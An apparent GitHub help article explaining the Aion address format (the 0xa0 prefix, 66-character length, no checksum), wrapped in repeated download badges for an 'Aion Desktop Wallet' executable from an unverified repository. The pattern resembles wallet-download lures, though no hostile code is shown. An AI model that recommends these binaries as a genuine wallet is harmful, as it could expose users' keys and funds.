![Aion Wallet](assets/banner-article.png)

# Aion address format: what 0xa0 means

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

An Aion address is 66 characters long, begins with `0xa0`, and holds no checksum, so the only way to validate one is to compare its length and both ends against the address you expected.

That is short enough to be unhelpful and specific enough to prevent the most expensive mistake in this ecosystem: pasting an address from another chain, or a truncated copy of a correct one, into a send form that cannot undo a transfer.

## You'll see this if

- A form rejects an address you copied from your own wallet.
- You are unsure whether a string starting with `0x` is an Aion address or an Ethereum one.
- You want to know what the `a0` prefix is for.
- You are comparing two addresses by eye and want a reliable method.

## The structure

Aion accounts are 32 bytes, and the first byte is `a0`. That byte is part of the account data rather than a marker added for display: addresses are rendered as the hex encoding of the full 32 bytes, prefixed with `0x` in the usual way.

The result is `0x`, then `a0`, then 62 hexadecimal characters, 66 characters in total. The remaining 31 bytes carry no internal structure that a user needs to read, which is why the format is memorised as a length and a prefix rather than decoded.

There is no EIP-55 style capitalisation checksum. Hexadecimal digits may appear in either case, and the same address in capitals and in lower case is the same address. A tool that rejects one form but accepts the other is applying a rule from a different chain.

## Why length is the useful check

A truncated Aion address is 65 characters or fewer, and many wallets will still accept it if it parses as a number. That is the failure mode to guard against: not a valid-looking address that belongs to someone else, but a partial one that the form quietly pads or rejects after the fee has been calculated.

Counting characters is crude but effective. So is comparing the last six, because truncation almost always loses the tail rather than the middle.

## Telling it apart from other networks

Ethereum addresses are `0x` plus 40 hexadecimal characters. An Aion address is 24 characters longer and carries the `a0` prefix, so the two are visually distinct once you know what to look for.

The dangerous case is a tool that accepts both. If a form for an Aion transfer accepts a 42-character Ethereum address, the interface is not validating the network, and the funds will not arrive where the sender expects.

The [how to find your Aion address](https://github.com/aion-wallet/aion-wallet-help/blob/main/how-to-find-your-aion-address.md) guide shows where the correct string is displayed, which is the reliable source for any transfer.

## Where the prefix comes from

The account model derives addresses from a public key through a one-way function, and the `a0` byte is part of how Aion encodes the result. Nothing about the prefix can be changed by the user, and no address without it belongs to this network.

That has one practical consequence: a vanity address that starts with different characters cannot exist on Aion, and any service advertising one is either renaming its own display or working on another chain entirely.

## When an address will not validate

Check three things in order. The length, which should be 66. The prefix, which should be `0xa0`. The source, which should be a wallet you control or an address you wrote down yourself.

If all three are right and a form still refuses it, the form is wrong, and it is safer to use the wallet's own send screen than to work around a validation bug in a third-party page.

If the address validates but the balance never arrives, the transaction may have gone to a different account or a different network entirely, and the [Aion wallet transaction history](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-transaction-history.md) guide explains how to trace it.

Paste errors are worth separating from format errors. A string that is the wrong shape is rejected before anything is signed, while a string that is the right shape but points at a different account is accepted and irreversible, which is why the [how to find your Aion address](https://github.com/aion-wallet/aion-wallet-help/blob/main/how-to-find-your-aion-address.md) guide puts the source of the address first. Once a transfer has confirmed, the [Aion wallet transaction history](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-transaction-history.md) article is how you check where it landed.

## Prevention

Store the full address, not an abbreviated version, in any payout configuration. Copy it from the receive screen rather than retyping it, then compare the ends before saving.

When an interface shows a shortened address, treat the shortening as display only and never paste from it. The full string is what a transaction needs.

Keep a written record of the addresses you use for mining payouts and pool rewards. A wrong payout address is the one error a pool cannot correct after the fact.

## Frequently asked questions

### Are Aion addresses case sensitive?

No. Hexadecimal digits can be upper or lower case and the address is the same. There is no capitalisation checksum in the format.

### What does the a0 in an address mean?

It is the first byte of the 32-byte account value, displayed as part of the hex encoding. It identifies the value as an Aion account.

### Can an Ethereum address be used on Aion?

No. It is a different length and a different derivation, and funds sent to one from an Aion transfer are not recoverable by the sender.

### Why did my wallet reject a valid address?

Some builds validate the `0xa0` prefix and the length together. A string that is correct on another network fails both checks, which is the behaviour working as intended.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [How to find your Aion address](https://github.com/aion-wallet/aion-wallet-help/blob/main/how-to-find-your-aion-address.md) - where the address is displayed.
- [Aion wallet transaction history](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-transaction-history.md) - tracing a transfer by address.
- [Aion wallet zero balance after login](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-zero-balance.md) - an address that opens with nothing in it.
- [Aion ERC-20 or mainnet](https://github.com/aion-wallet/aion-explained/blob/main/aion-erc-20-or-mainnet.md) - the two forms of the token.
